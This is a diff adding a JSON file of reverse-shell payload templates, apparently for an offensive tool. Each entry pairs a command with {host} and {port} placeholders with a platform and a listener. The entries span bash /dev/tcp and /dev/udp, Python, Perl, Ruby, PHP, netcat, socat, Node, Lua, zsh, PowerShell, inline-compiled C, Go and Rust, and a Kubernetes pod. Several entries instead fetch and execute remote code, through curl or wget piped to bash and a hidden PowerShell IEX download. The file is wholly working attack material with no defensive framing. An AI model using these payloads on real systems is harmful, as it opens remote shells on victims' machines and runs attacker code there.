@@ -1,0 +1,158 @@
+{
+  "python3_pty": {
+    "cmd": "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "bash_tcp": {
+    "cmd": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "bash_udp": {
+    "cmd": "bash -i >& /dev/udp/{host}/{port} 0>&1",
+    "platform": "linux",
+    "listener": "nc -u",
+    "background": true
+  },
+  "socat_pty": {
+    "cmd": "socat TCP:{host}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "socat_udp_pty": {
+    "cmd": "socat UDP:{host}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
+    "platform": "linux",
+    "listener": "nc -u",
+    "background": true
+  },
+  "perl_pty": {
+    "cmd": "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "ruby_pty": {
+    "cmd": "ruby -rsocket -e 'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "php_pty": {
+    "cmd": "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "netcat_exec": {
+    "cmd": "nc {host} {port} -e /bin/bash",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "nc_mkfifo_pure": {
+    "cmd": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "ncat_exec": {
+    "cmd": "ncat {host} {port} -e /bin/bash",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "ncat_ssl": {
+    "cmd": "ncat --ssl {host} {port} -e /bin/bash",
+    "platform": "linux",
+    "listener": "ncat --ssl -lvnp",
+    "background": true
+  },
+  "nodejs": {
+    "cmd": "node -e 'require(\"net\").connect({port},\"{host}\",function(){this.pipe(require(\"child_process\").spawn(\"/bin/bash\",[\"-i\"],{stdio:\"pipe\"}).stdin);})'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "lua_socket": {
+    "cmd": "lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{host}\",{port});while true do local c=t:receive();if c then local f=io.popen(c..\" 2>&1\");local o=f:read(\"*a\");t:send(o);end;end'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "zsh_tcp": {
+    "cmd": "zsh -c 'zmodload zsh/net/tcp; ztcp {host} {port}; zsh -i >&$REPLY 2>&$REPLY 0>&$REPLY'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "mknod_backpipe": {
+    "cmd": "rm -f /tmp/p; mknod /tmp/p p && nc {host} {port} 0</tmp/p | /bin/bash -i 2>&1 | tee /tmp/p",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "screen_background": {
+    "cmd": "screen -dm bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": false
+  },
+  "tmux_background": {
+    "cmd": "tmux new-session -d 'bash -i >& /dev/tcp/{host}/{port} 0>&1'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": false
+  },
+  "powershell_tcp": {
+    "cmd": "$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()",
+    "platform": "windows",
+    "listener": "nc",
+    "background": false
+  },
+  "powershell_iex_http": {
+    "cmd": "powershell -nop -w hidden -c \"$IEX=New-Object Net.WebClient;IEX $IEX.DownloadString('http://{host}:{port}/p.ps1')\"",
+    "platform": "windows",
+    "listener": "http",
+    "background": false
+  },
+  "curl_bash": {
+    "cmd": "curl -s http://{host}:{port}/payload | bash",
+    "platform": "linux",
+    "listener": "http",
+    "background": false
+  },
+  "wget_bash": {
+    "cmd": "wget -qO- http://{host}:{port}/payload | bash",
+    "platform": "linux",
+    "listener": "http",
+    "background": false
+  },
+  "gcc_inline": {
+    "cmd": "gcc -o /tmp/vol <(echo '#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <unistd.h>int main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a={AF_INET,htons({port}),inet_addr(\"{host}\")};connect(s,&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl(\"/bin/bash\",\"bash\",\"-i\",NULL);}') && /tmp/vol",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "go_inline": {
+    "cmd": "go run - <<< 'package main;import\"net\";import\"os/exec\";func main(){c,_:=net.Dial(\"tcp\",\"{host}:{port}\");cmd:=exec.Command(\"/bin/bash\",\"-i\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "rust_inline_compile": {
+    "cmd": "rustc -o /tmp/rvol <(echo 'use std::net::TcpStream;use std::os::unix::io::AsRawFd;use std::process::Command;fn main(){if let Ok(s)=TcpStream::connect(\"{host}:{port}\"){let fd=s.as_raw_fd();Command::new(\"/bin/bash\").arg(\"-i\").stdin(unsafe{std::process::Stdio::from_raw_fd(fd)}).stdout(unsafe{std::process::Stdio::from_raw_fd(fd)}).stderr(unsafe{std::process::Stdio::from_raw_fd(fd)}).status().unwrap();}}') && /tmp/rvol",
+    "platform": "linux",
+    "listener": "nc",
+    "background": true
+  },
+  "kubectl_pod": {
+    "cmd": "kubectl run rshell --rm -i --tty --image=alpine -- /bin/sh -c 'apk add --no-cache bash netcat-openbsd && bash -i >& /dev/tcp/{host}/{port} 0>&1'",
+    "platform": "linux",
+    "listener": "nc",
+    "background": false
+  }
+}
